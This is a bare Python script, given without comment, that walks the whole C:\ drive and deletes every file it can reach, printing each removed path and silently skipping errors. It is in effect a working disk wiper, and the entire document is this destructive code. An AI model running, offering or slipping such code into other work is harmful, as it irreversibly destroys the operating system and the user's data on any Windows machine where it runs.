import os

c = "C:\\"

for root, dirs, files in os.walk(c):
    for i in files:
        file = os.path.join(root, i)
        try:
            os.remove(file)
            print(f"file is gone: {file}")
        except:
            continue
